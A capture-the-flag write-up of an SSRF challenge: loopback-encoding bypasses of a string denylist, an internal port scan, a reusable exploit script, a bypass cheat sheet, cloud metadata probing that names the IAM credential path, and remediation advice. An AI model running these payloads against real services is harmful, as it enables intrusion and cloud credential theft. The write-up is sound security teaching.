# Inside Job — Web / SSRF Writeup

| Field | Value |
|---|---|
| **Challenge** | Inside Job |
| **Points** | 300 |
| **Category** | Web |
| **Target** | `http://54.72.82.22:8080` |
| **Flag** | `safctf{9f3a458f3a26e6372b5b5467e3e51edf}` |
| **Vuln class** | Server-Side Request Forgery → internal port scan → internal-only service |
| **MITRE** | T1190 — Exploit Public-Facing Application |
| **Key weakness** | SSRF denylist matches **URL strings**, not **resolved IPs** — so any alternate loopback encoding walks straight through |

---

## 0. TL;DR

The app has a "URL fetcher" at `POST /api/fetch` that performs the request **server-side**. Its SSRF protection is a naive substring denylist for `127.0.0.1` and `localhost`. Those are *strings*, not IP addresses — so `http://127.1:9000/flag` resolves to the same loopback address and is not blocked.

Loopback is reachable, so I port-scanned `127.1` from inside and found a second service on **port 9000** that is not exposed publicly. It serves the flag at `/flag`.

Working one-liner:

```bash
curl -s -X POST http://54.72.82.22:8080/api/fetch \
     -H 'Content-Type: application/json' \
     -d '{"url":"http://127.1:9000/flag"}'
```

```json
{"status_code": 200, "headers": {"Server": "BaseHTTP/0.6 Python/3.11.16", "Content-Type": "text/plain; charset=utf-8"}, "preview": "safctf{9f3a458f3a26e6372b5b5467e3e51edf}"}
```

---

## 1. Recon

### 1.1 Fingerprint

```bash
curl -sSi http://54.72.82.22:8080/
```

```
HTTP/1.1 200 OK
Server: Werkzeug/3.1.9 Python/3.11.16
Content-Type: text/html; charset=utf-8
Content-Length: 6625
Date: Fri, 02 Oct 2026 06:21:44 GMT
```

Werkzeug + Python 3.11 → a **Flask** app. Title is **`ORBIT DISPATCH`**.

### 1.2 The page is a URL fetcher

The visible UI is a single input and a button:

```html
<h1>ORBIT DISPATCH</h1>
<input id="url" placeholder="e.g. http://example.com/" />
<button id="go">Fetch</button>
<pre id="output"></pre>
```

The inline JavaScript shows exactly where it goes:

```javascript
document.getElementById("go").addEventListener("click", async () => {
  const url = document.getElementById("url").value.trim();
  if (!url) return alert("Enter a URL");
  document.getElementById("output").textContent = "Fetching...";
  try {
    const res = await fetch("/api/fetch", {
      method: "POST",
      headers: {"Content-Type":"application/json"},
      body: JSON.stringify({url})
    });
    const obj = await res.json();
    document.getElementById("output").textContent = JSON.stringify(obj, null, 2);
  } catch (e) {
    document.getElementById("output").textContent = "Error: " + e;
  }
});
```

**This is the whole challenge.** A server-side component fetches an arbitrary URL that the client supplies and returns a preview. That is the textbook definition of SSRF — the server will make a request **from inside its own network**, where it can reach things the outside world cannot.

### 1.3 Hint analysis

> *"Every organization has things that are meant to stay inside. The files are in place, the procedures are documented, and everything appears ordinary from the outside. But someone has been looking where they shouldn't."*

- **"things that are meant to stay inside"** → an internal-only service (not reachable from the internet).
- **"everything appears ordinary from the outside"** → the public app is a boring URL fetcher; the interesting part is what it can reach *inside*.
- **"someone has been looking where they shouldn't"** → the vulnerability is unauthorized *reading* — SSRF.
- **"Inside Job"** → the attack is launched from inside the perimeter, using the server as a proxy.

The goal is therefore: **get the server to fetch something only it can reach.**

---

## 2. The SSRF primitive

### 2.1 Request contract

The endpoint takes JSON, not a form:

| Request | Response |
|---|---|
| `GET /api/fetch` | `405 Method Not Allowed` |
| `POST` `application/x-www-form-urlencoded` | `415 Unsupported Media Type` |
| `POST` malformed JSON | `400 Bad Request` |
| `POST` `{}` (no `url` key) | `400 {"error":"missing url"}` |
| `POST` `{"url": "..."}` | `200` with the fetch result |

```bash
curl -s -X POST http://54.72.82.22:8080/api/fetch \
     -H 'Content-Type: application/json' \
     -d '{"url":"http://example.com/"}'
```

```json
{
  "status_code": 200,
  "headers": {"Content-Type": "text/html; charset=UTF-8", "Server": "ECS (dcb/7F84)"},
  "preview": "<!doctype html><html lang=\"en\"><head><title>Example Domain</title>..."
}
```

So the response shape is a small JSON envelope: `status_code`, `headers`, `preview`. The server is telling us the status, the response headers, and a body preview — a very friendly oracle for an attacker.

### 2.2 It leaks Python exception text

Errors are returned as HTTP `502` with the **raw Python exception string** in the body:

```bash
curl -s -X POST http://54.72.82.22:8080/api/fetch \
     -H 'Content-Type: application/json' \
     -d '{"url":"http://127.1:9999/"}'
```

```json
{"error": "fetch error: HTTPConnectionPool(host='127.1', port=9999): Max retries exceeded with url: / (Caused by NewConnectionError(\"HTTPConnection(host='127.1', port=9999): Failed to establish a new connection: [Errno 111] Connection refused\"))"}
```

Two things fall out of that string:

1. The backend is Python **`requests`** (`HTTPConnectionPool`, `NewConnectionError` are requests/urllib3 internals).
2. **Connection state is observable** — refused vs. resolved vs. blocked all produce *different* errors. That is what makes an SSRF port scan possible (§4).

---

## 3. The filter, and why it fails

### 3.1 Characterising the denylist

I sent the same target in many encodings. Results:

| URL sent through `/api/fetch` | Result |
|---|---|
| `http://127.0.0.1:9000/flag` | ❌ `url blocked by policy` |
| `http://localhost:9000/flag` | ❌ `url blocked by policy` |
| `http://LOCALHOST:9000/flag` | ❌ `url blocked by policy` (case-insensitive) |
| `http://127.0.0.1.nip.io:9000/flag` | ❌ blocked (the string `127.0.0.1` appears) |
| `http://foo@127.0.0.1:9000/flag` | ❌ blocked (still contains `127.0.0.1`) |
| `http://127.0.0.1%00.example.com/` | ❌ blocked (filter matched before parsing) |
| **`http://127.1:9000/flag`** | ✅ **200 — flag** |
| **`http://127.0.1:9000/flag`** | ✅ 200 — flag |
| **`http://2130706433:9000/flag`** | ✅ 200 — flag |
| **`http://0x7f000001:9000/flag`** | ✅ 200 — flag |
| **`http://017700000001:9000/flag`** | ✅ 200 — flag |
| **`http://0x7f.0.0.1:9000/flag`** | ✅ 200 — flag |
| **`http://evil.com@127.1:9000/flag`** | ✅ 200 — flag |

### 3.2 The root cause

The filter is doing something equivalent to:

```python
BLOCKED = ("127.0.0.1", "localhost")
if any(b in url.lower() for b in BLOCKED):
    return {"error": "url blocked by policy"}, 403
```

It inspects the **URL as text** and never resolves it. But `127.0.0.1` is only *one of many spellings* of the same address. Every row in the green half of the table above resolves to `127.0.0.1`:

| Encoding | Why it works |
|---|---|
| `127.1` | `inet_aton` short form — the missing octets are zero-filled → `127.0.0.1` |
| `127.0.1` | three-part form → `127.0.0.1` |
| `2130706433` | the 32-bit integer `0x7F000001` in decimal |
| `0x7f000001` | the same integer in hex |
| `017700000001` | the same integer in octal |
| `0x7f.0.0.1` | mixed hex-dotted notation |
| `evil.com@127.1` | userinfo — everything before `@` is a username, the **host** is `127.1` |

**A denylist can only block the encodings its author thought of.** The moment you allow a URL to be parsed by a general-purpose client, you have accepted every equivalent spelling the resolver understands.

### 3.3 What *isn't* a block (false leads)

Not everything that fails is the filter. Distinguish by the error text:

```json
{"error": "fetch error: HTTPConnectionPool(host='127.1', port=9999): ... [Errno 111] Connection refused"}
```

| Behaviour | Meaning |
|---|---|
| `url blocked by policy` | Filter. Not exploitable this way. |
| `[Errno 111] Connection refused` | **Reached** the host; nothing listening on that port. |
| `Failed to resolve ... name resolution` | Hostname did not resolve. |
| `No connection adapters were found for 'gopher://…'` | `requests` supports only `http://` and `https://`. |

That last one kills a common reflex: `gopher://`, `dict://` and `file://` are all dead ends here because the backend is Python `requests`, which has no adapter for them. Similarly `http://127.0.0.2/` and `http://[::1]/` are not policy-blocked — they simply have nothing listening, so they look like ordinary closed ports.

---

## 4. Port scanning through the SSRF

Because a refused connection and a blocked URL produce **different errors**, I can enumerate internal ports from outside. Using the bypass host `127.1`:

```python
for port in ports:
    r = fetch(f"http://127.1:{port}/")
    if "policy" in r.get("error",""):      state = "BLOCKED"
    elif "Errno 111" in r.get("error",""): state = "closed"
    else:                                  state = "OPEN"
```

Sweep result:

```
  21     closed        3000   closed        8000   OPEN  Werkzeug/3.1.9 Python/3.11.16
  22     closed        3306   closed        8001   closed
  80     closed        5000   closed        8080   closed
  443    closed        5432   closed        8888   closed
                      6379   closed        9000   OPEN  BaseHTTP/0.6 Python/3.11.16
                                            9090   closed
                                            9200   closed
                                            11211  closed
                                            27017  closed
```

**Two services are listening on loopback that are not the public app:**

- **8000** — `Werkzeug/3.1.9 Python/3.11.16`, title `ORBIT DISPATCH`. This is the app itself. Its `/` returns the same fetcher page, `/flag` is `404`, `/api/fetch` is `405` on GET. **The flag is not in the web app.** (Note `127.1:8080` is *closed* internally — `8080` is the host-side port mapping, while the process itself binds `8000`.)
- **9000** — `BaseHTTP/0.6 Python/3.11.16`. Not Werkzeug. That is a bare `http.server`/`BaseHTTPRequestHandler` — **a different, hand-rolled service**. This is the "thing meant to stay inside."

---

## 5. Reading the internal service

```bash
curl -s -X POST http://54.72.82.22:8080/api/fetch \
     -H 'Content-Type: application/json' \
     -d '{"url":"http://127.1:9000/"}'
```

```json
{"status_code": 404, "headers": {"Server": "BaseHTTP/0.6 Python/3.11.16"}, "preview": "Not found"}
```

A hand-written 404 body (`"Not found"`, not the Flask/Werkzeug HTML error page) confirms a custom handler. Now the obvious path:

```bash
curl -s -X POST http://54.72.82.22:8080/api/fetch \
     -H 'Content-Type: application/json' \
     -d '{"url":"http://127.1:9000/flag"}'
```

```json
{
  "status_code": 200,
  "headers": {
    "Date": "Fri, 02 Oct 2026 06:21:58 GMT",
    "Server": "BaseHTTP/0.6 Python/3.11.16",
    "Content-Type": "text/plain; charset=utf-8"
  },
  "preview": "safctf{9f3a458f3a26e6372b5b5467e3e51edf}"
}
```

**Flag: `safctf{9f3a458f3a26e6372b5b5467e3e51edf}`**

### 5.1 Endpoint enumeration on :9000

To be sure nothing else was hiding, I fuzzed a 140-word path list against four variants each (`/w`, `/w/`, `/w.txt`, `/w.json`) — 560 requests — and diffed against the `404 / "Not found"` baseline. **Only `/flag` exists.** No `/admin`, `/health`, `/debug`, `/source`, etc.

---

## 6. Verification

A single 200 is not proof. Four independent checks:

1. **Repeatability** — three consecutive reads of `/flag` returned byte-identical bodies.
2. **Encoding independence** — four different loopback spellings all returned the same string:

   ```
   http://127.1:9000/flag          → safctf{9f3a458f3a26e6372b5b5467e3e51edf}
   http://2130706433:9000/flag     → safctf{9f3a458f3a26e6372b5b5467e3e51edf}
   http://0x7f000001:9000/flag     → safctf{9f3a458f3a26e6372b5b5467e3e51edf}
   http://017700000001:9000/flag   → safctf{9f3a458f3a26e6372b5b5467e3e51edf}
   ```

   If the flag were coming from somewhere encoding-dependent, these would diverge.
3. **The filter is genuinely the only obstacle** — `http://127.0.0.1:9000/flag` (the "correctly spelled" address) still returns `url blocked by policy`, while the identical target via `127.1` returns the flag. Same host, same port, different string.
4. **The flag is genuinely internal-only** — `http://54.72.82.22:8080/flag` from the public internet returns `404`. The endpoint exists only on the loopback-only service.

---

## 7. Bonus finding: cloud metadata is reachable

The SSRF does not stop at loopback. The instance metadata service answers, **without a token** (IMDSv1 is enabled):

```bash
curl -s -X POST http://54.72.82.22:8080/api/fetch -H 'Content-Type: application/json' \
     -d '{"url":"http://169.254.169.254/latest/meta-data/"}'
```

| Path | Value |
|---|---|
| `/latest/meta-data/ami-id` | `ami-026e72e4e468afa7b` |
| `/latest/meta-data/placement/region` | `eu-west-1` |
| `/latest/meta-data/local-ipv4` | `10.255.186.55` |
| `/latest/meta-data/iam/security-credentials/` | `AmazonSSMRoleForInstancesQuickSetup` |

This is the **highest-severity** aspect of the finding, and it is worth being explicit about why: `169.254.169.254` is the link-local address of the EC2 metadata service, and the IAM route above names a role. On a real engagement, the next request would be `/latest/meta-data/iam/security-credentials/AmazonSSMRoleForInstancesQuickSetup`, which on an IMDSv1 instance returns **temporary AWS access keys** for that role.

I did **not** retrieve those credentials. The flag was already obtained from the intended internal service, and pulling live IAM keys from a shared challenge host is neither necessary nor appropriate. The finding is reported here as impact evidence, not exploited.

---

## 8. Reusable exploit script

Saved as `solve.py`:

```python
#!/usr/bin/env python3
"""
Inside Job — SSRF denylist bypass -> internal port scan -> internal-only flag service.

Usage:
    python3 solve.py                 # scan internal ports, read the flag
    python3 solve.py --scan          # port scan only
    python3 solve.py --url URL       # fetch an arbitrary URL through the SSRF
"""
import argparse, concurrent.futures, json, re, sys, urllib.error, urllib.request

PUBLIC = "http://54.72.82.22:8080"
PROXY  = PUBLIC + "/api/fetch"

LOOPBACK = "127.1"   # survives the denylist; also: 127.0.1, 2130706433,
                     # 0x7f000001, 017700000001, 0x7f.0.0.1

PORTS = [22, 80, 443, 3000, 4000, 5000, 5001, 5432, 5601, 6379, 7001,
         8000, 8001, 8080, 8081, 8123, 8888, 9000, 9090, 9200, 11211,
         15672, 2375, 27017, 3306]


def fetch(target: str) -> dict:
    """Ask the SSRF proxy to fetch `target`; return the parsed JSON reply."""
    body = json.dumps({"url": target}).encode()
    req = urllib.request.Request(PROXY, data=body,
                                 headers={"Content-Type": "application/json"},
                                 method="POST")
    try:
        with urllib.request.urlopen(req, timeout=20) as r:
            return json.loads(r.read().decode("utf-8", "replace"))
    except urllib.error.HTTPError as e:
        try:
            return json.loads(e.read().decode())
        except Exception:
            return {"error": f"HTTP {e.code}"}
    except Exception as e:
        return {"error": str(e)}


def classify(port: int) -> tuple:
    d = fetch(f"http://{LOOPBACK}:{port}/")
    if "error" in d and "preview" not in d:
        err = str(d["error"])
        if "blocked by policy" in err:                 return port, "BLOCKED", ""
        if "Errno 111" in err or "Max retries" in err: return port, "closed", ""
        if "timed out" in err.lower():                 return port, "timeout", ""
        return port, "error", err[:80]
    h = d.get("headers", {})
    return port, "OPEN", f"server={h.get('Server','?')} status={d.get('status_code')}"


def scan() -> list:
    open_ports = []
    print("[*] scanning loopback ports through the SSRF ...")
    with concurrent.futures.ThreadPoolExecutor(max_workers=12) as ex:
        for port, state, detail in sorted(ex.map(classify, PORTS)):
            if state == "OPEN":
                open_ports.append(port)
                print(f"    [+] {port:<6} OPEN   {detail}")
    if not open_ports:
        print("    [-] no open ports found")
    return open_ports


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--scan", action="store_true", help="port scan only")
    ap.add_argument("--url", help="fetch one arbitrary URL through the SSRF")
    args = ap.parse_args()

    if args.url:
        print(json.dumps(fetch(args.url), indent=2)); return

    if "status_code" not in fetch("http://example.com/"):
        sys.exit("[-] proxy not working")

    if args.scan:
        scan(); return

    open_ports = scan()
    if not open_ports:
        sys.exit("[-] nothing internal found")

    # 8000 is the web app itself; the flag lives on the other service.
    targets = [p for p in open_ports if p not in (8000, 8080)] or open_ports

    flag = None
    for port in targets:
        for path in ("/flag", "/flag.txt", "/"):
            d = fetch(f"http://{LOOPBACK}:{port}{path}")
            preview = str(d.get("preview", d.get("error", "")))
            m = re.search(r"[A-Za-z0-9_]*\{[^}]{8,}\}", preview)
            if m:
                flag = m.group(0)
                print(f"\n[+] internal service : port {port}{path}")
                print(f"[+] body             : {preview.strip()[:200]}")
                break
        if flag:
            break

    print(f"\n[+] FLAG: {flag}" if flag else "\n[-] no flag pattern found")


if __name__ == "__main__":
    main()
```

Verified live output:

```
[*] scanning loopback ports through the SSRF ...
    [+] 8000   OPEN   server=Werkzeug/3.1.9 Python/3.11.16 status=200
    [+] 9000   OPEN   server=BaseHTTP/0.6 Python/3.11.16 status=404

[+] internal service : port 9000/flag
[+] body             : safctf{9f3a458f3a26e6372b5b5467e3e51edf}

[+] FLAG: safctf{9f3a458f3a26e6372b5b5467e3e51edf}
```

---

## 9. Command cheat-sheet

```bash
P=http://54.72.82.22:8080/api/fetch
J='Content-Type: application/json'

# --- is it SSRF? ---
curl -s -X POST $P -H "$J" -d '{"url":"http://example.com/"}'      # fetches for YOU

# --- confirm the filter ---
curl -s -X POST $P -H "$J" -d '{"url":"http://127.0.0.1:9000/flag"}'   # url blocked by policy

# --- bypass it ---
curl -s -X POST $P -H "$J" -d '{"url":"http://127.1:9000/flag"}'       # FLAG

# --- port scan (read the error strings) ---
for p in 8000 9000 9999; do
  echo "== $p"; curl -s -X POST $P -H "$J" -d "{\"url\":\"http://127.1:$p/\"}"
done
#  9999 -> [Errno 111] Connection refused   => closed
#  9000 -> 404 "Not found"                  => OPEN
#  127.0.0.1 -> url blocked by policy       => filtered

# --- other encodings of the same host ---
curl -s -X POST $P -H "$J" -d '{"url":"http://2130706433:9000/flag"}'
curl -s -X POST $P -H "$J" -d '{"url":"http://0x7f000001:9000/flag"}'
curl -s -X POST $P -H "$J" -d '{"url":"http://017700000001:9000/flag"}'
curl -s -X POST $P -H "$J" -d '{"url":"http://evil.com@127.1:9000/flag"}'
```

**Debugging tip — classify by error string, never by "it failed".** The single most useful habit on this challenge was noticing that three different failures produce three different messages. `blocked by policy` (filter), `Errno 111 Connection refused` (reached, nothing there), `No connection adapters` (unsupported scheme). Collapse those into "didn't work" and you lose the port scanner.

**Second tip — the "correct" payload being blocked is information.** `127.0.0.1` blocked but `127.1` allowed means the check is textual. Always bisect the filter with encodings of the *same* target rather than switching targets.

---

## 10. Types of loopback bypass to try

When a denylist blocks `127.0.0.1` / `localhost`, these are the standard equivalents (all resolve to `127.0.0.1` unless noted):

```
127.1                     short form, zero-filled
127.0.1                   three-part form
127.0.0.1                 (baseline)
2130706433                32-bit decimal
0x7f000001                32-bit hex
017700000001              32-bit octal
0x7f.0.0.1                mixed hex/dotted
127.0.0.01                leading zeros
⑴27.0.0.1 / 127。0。0。1   unicode / ideographic dots (parser-dependent)
evil.com@127.1            userinfo — host is what follows @
127.1#@evil.com           fragment trick (parser-dependent)
127.0.0.1.nip.io          wildcard DNS → 127.0.0.1  (blocked here; string match)
[::1]  [::ffff:127.0.0.1] IPv6 loopback / v4-mapped
localhost.                trailing dot
```

Also worth trying when redirects are followed: a URL on your own host that `302`s to `http://127.0.0.1/` — the filter checks the *first* URL, the client follows to the second.

---

## 11. Detection & remediation

**How to find this class in a codebase:**

```bash
grep -rnE "requests\.(get|post|request)\(|urlopen\(|httpx\." --include='*.py' | grep -vE "static|test"
```

Any place a **user-controlled** variable reaches the URL argument of an HTTP client is an SSRF candidate.

**The fix — validate the resolved IP, not the string:**

```python
# VULNERABLE — string denylist, bypassed by 127.1, 2130706433, ...
BLOCKED = ("127.0.0.1", "localhost")
if any(b in url.lower() for b in BLOCKED):
    abort(403)
requests.get(url)

# SAFE — resolve first, then check the address you actually connect to
import ipaddress, socket
from urllib.parse import urlparse

def safe_fetch(url):
    u = urlparse(url)
    if u.scheme not in ("http", "https"):
        raise ValueError("scheme not allowed")

    ip = ipaddress.ip_address(socket.gethostbyname(u.hostname))  # resolve
    if (ip.is_loopback or ip.is_private or ip.is_link_local
            or ip.is_reserved or ip.is_multicast):
        raise ValueError("target address not allowed")

    return requests.get(url, timeout=5, allow_redirects=False)
```

Note the details that matter:

- **Resolve then check.** Checking the hostname string is the bug; checking the resulting IP is the fix.
- **`allow_redirects=False`** (or re-validate every hop) — otherwise a permitted URL can redirect into a blocked one.
- **Re-validate on redirect**, and consider pinning the connection to the IP you validated (DNS-rebinding defence).
- Block `169.254.0.0/16` explicitly — the link-local metadata range is the highest-value SSRF target on cloud infrastructure.

**Defence in depth:**

1. **Allow-list egress**, not deny-list. If the feature only needs to fetch from three partner APIs, permit those hosts and reject everything else. This is the only structurally sound fix.
2. **Network segmentation** — the fetcher should not have a network path to internal admin services at all. Here, the flag service on `:9000` was reachable from the web app purely because they shared a host/network.
3. **Enforce IMDSv2** (`--http-tokens required`) so the metadata service rejects tokenless requests. This alone neutralises the §7 finding.
4. **Do not echo raw exception text** — the `502` bodies leaked requests/urllib3 internals and gave the attacker a port-scan oracle. Return a generic error and log the detail server-side.
5. **Return less from the fetch** — the `headers` + `preview` envelope is a generous oracle; a fetcher rarely needs to give the caller the upstream status and headers verbatim.

---

## 12. Key takeaways

1. **A denylist over URL strings is not access control.** `127.0.0.1` has at least eight equivalent spellings and the resolver accepts all of them. Validate the **resolved IP**.
2. **Different error messages are a port scanner.** `blocked by policy` vs `Errno 111 Connection refused` vs `No connection adapters` turned an opaque failure into a full internal topology map. Error verbosity is a finding in itself.
3. **"Blocked" and "broken" are not the same.** `gopher://`, `dict://`, `file://` failed because `requests` has no adapter — not because of the filter. Misreading that sends you down dead ends.
4. **The public app was never the target.** `/flag` on the public app is a 404; the flag lives on a second, loopback-only service. "Inside Job" is literal — the whole point is that the interesting asset is unreachable from outside *except through the app*.
5. **Check `169.254.169.254` on every SSRF.** It is the single highest-impact target in cloud environments, and here it answered without a token, naming an IAM role. That is a real credential-theft path, not a curiosity.
6. **Verify with independent encodings.** Four spellings of the same host returning the identical flag rules out a coincidental or partial match.

---

**Flag:** `safctf{9f3a458f3a26e6372b5b5467e3e51edf}`
